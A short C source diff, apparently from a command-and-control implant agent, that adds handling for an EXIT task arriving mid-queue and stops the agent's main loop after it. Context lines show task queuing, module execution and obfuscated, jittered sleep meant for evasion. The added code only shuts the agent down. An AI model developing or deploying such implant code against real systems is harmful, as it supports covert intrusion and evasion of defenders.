@@ -475,6 +475,15 @@ BOOL agent_checkin(AgentState *state) {
                 /* If we were building a previous task, execute it first */
                 if (in_task) {
                     task_count++;
+
+                    /* Check for EXIT in mid-queue position */
+                    if (current_task.task_type == TASK_EXIT) {
+                        DBG("[task] EXIT task received (mid-queue) — shutting down");
+                        state->running = FALSE;
+                        free(plaintext);
+                        return TRUE;
+                    }
+
                     DBG("[task] executing queued task #%d: type=0x%02X module='%s' args_len=%u",
                         task_count, current_task.task_type, current_task.module_name,
                         current_task.arguments_len);
@@ -648,6 +657,9 @@ void agent_run(AgentState *state) {
                 evasion_sleep_obfuscated(3600000); /* 1 hour */
             }
         }
+
+        /* Exit immediately if checkin received EXIT task */
+        if (!state->running) break;
 
         /* Sleep with jitter */
         int jitter = 0;
